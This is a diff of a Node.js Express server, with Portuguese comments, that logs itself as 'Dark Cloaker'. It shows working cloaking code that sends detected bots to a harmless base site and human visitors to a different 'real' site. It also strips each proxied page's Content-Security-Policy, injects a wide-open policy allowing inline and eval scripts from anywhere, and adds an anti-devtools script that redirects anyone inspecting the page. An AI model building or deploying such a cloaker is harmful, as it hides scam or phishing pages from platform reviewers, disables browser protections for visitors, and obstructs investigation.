@@ -3,27 +3,27 @@ const express = require("express");
 const mongoose = require("mongoose");
 const cors = require("cors");
 const helmet = require("helmet");
-const { createProxyMiddleware } = require("http-proxy-middleware");
+const axios = require("axios");
 const { isBot } = require("./utils/botDetection");
 const { mutateHTMLSafe } = require("./utils/mutator");
 const Domain = require("./models/Domain");
-const axios = require("axios");
 
 const app = express();
 
-// Segurança
+// 🛡 Segurança digital
 app.use(cors());
 app.use(helmet());
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
-// Rotas da API
-const authRoutes = require("./routes/auth.routes");
-const domainRoutes = require("./routes/domain.routes");
-app.use("/api/auth", authRoutes);
-app.use("/api/domain", domainRoutes);
+// 🗂 Serve arquivos estáticos locais (sem CORS, sem proxy)
+app.use("/assets", express.static("public/assets"));
 
-// Conexão MongoDB
+// 🔗 Rotas de API
+app.use("/api/auth", require("./routes/auth.routes"));
+app.use("/api/domain", require("./routes/domain.routes"));
+
+// 🔌 Conexão com MongoDB
 (async () => {
   try {
     await mongoose.connect(process.env.MONGO_URI);
@@ -34,7 +34,7 @@ app.use("/api/domain", domainRoutes);
   }
 })();
 
-// Middleware universal (cloaking + proxy)
+// 🎭 Middleware universal de cloaking + injeção
 app.use(async (req, res, next) => {
   try {
     const host = req.hostname;
@@ -49,55 +49,49 @@ app.use(async (req, res, next) => {
     const targetUrl = isBotVisit ? domain.baseUrl : domain.realUrl;
     const fullUrl = `${targetUrl}${urlPath}`;
 
-    // 🔁 Proxy de assets (css, js, fontes, imagens, etc)
+    // 🔎 Detecta se é asset (mas agora servimos local!)
     const isAsset = /\.(js|css|png|jpe?g|gif|svg|woff2?|ttf|eot|ico|json|txt|webp|mp4|map)(\?.*)?$/.test(urlPath);
-    if (isAsset) {
-      return createProxyMiddleware({
-        target: targetUrl,
-        changeOrigin: true,
-        selfHandleResponse: false,
-        headers: {
-          "User-Agent": ua,
-          "X-Forwarded-For": ip,
-          Referer: req.get("referer") || '',
-        }
-      })(req, res);
-    }
+    if (isAsset) return next(); // deixa o express.static cuidar
 
-    // 🔁 Proxy do HTML principal (com mutação e proteção)
+    // 📡 Requisição do HTML do site real (para humano)
     const headers = {
       "User-Agent": ua,
       "X-Forwarded-For": ip,
-      Referer: req.get("referer") || '',
+      Referer: req.get("referer") || "",
     };
 
     const response = await axios.get(fullUrl, { headers });
     let html = response.data;
 
-    // Proteção anti-devtools e clonagem
-     const antiDebug = `
+    // 🛡 Anti-clonagem e anti-devtools
+    const antiDebug = `
       <script>
-        function devtoolsDetector(){
+        function devtoolsDetector() {
           const s = performance.now(); debugger; const e = performance.now();
-          if(e-s>100){ window.location.href='${domain.fallbackUrl}'; }
+          if (e - s > 100) window.location.href = '${domain.fallbackUrl}';
         }
-    
+        setInterval(devtoolsDetector, 2000);
       </script>
     `;
 
+    // 🧬 Mutação: caminhos + CSP + injeções
     html = mutateHTMLSafe(html);
-    // Substitui './assets' ou 'assets' por caminho absoluto
-    html = html.replace(/(src|href)=["']\.?\/?assets\//g, `$1="${targetUrl}/assets/`);
-    html = html.replace(/(src|href)=["']\/(.*?)["']/g, `$1="${targetUrl}/$2"`);
+
+    // Troca caminhos para assets locais
+    html = html.replace(/(src|href)=["']\.?\/?assets\//g, `$1="/assets/`);
+    html = html.replace(/(src|href)=["']\/(.*?)["']/g, `$1="/assets/$2"`);
+
+    // Remove CSP original e injeta o nosso CSP satânico
     html = html.replace(/<meta[^>]+http-equiv=["']Content-Security-Policy["'][^>]*>/gi, "");
-    html = html.replace(/<meta[^>]+Content-Security-Policy[^>]+>/gi,
-  `<meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;">`);
+    html = html.replace(/<meta[^>]+Content-Security-Policy[^>]+>/gi, "");
+    html = html.replace("</head>", `<meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;">\n</head>`);
     html = html.replace("</body>", `${antiDebug}</body>`);
 
+    // Cabeçalhos finais
     res.setHeader("Content-Type", "text/html; charset=utf-8");
     res.setHeader("Access-Control-Allow-Origin", "*");
     res.setHeader("Content-Security-Policy", "default-src * data: blob: 'unsafe-inline' 'unsafe-eval'; script-src * 'unsafe-inline' 'unsafe-eval'; style-src * 'unsafe-inline'; img-src * data: blob:; font-src * data:");
-    
+
     return res.send(html);
 
   } catch (err) {
@@ -106,7 +100,7 @@ app.use(async (req, res, next) => {
   }
 });
 
-// Start
+// 🚀 Start do servidor
 const PORT = process.env.PORT || 8080;
 app.listen(PORT, () => {
   console.log(`☠️ Dark Cloaker rodando blindado na porta ${PORT}`);
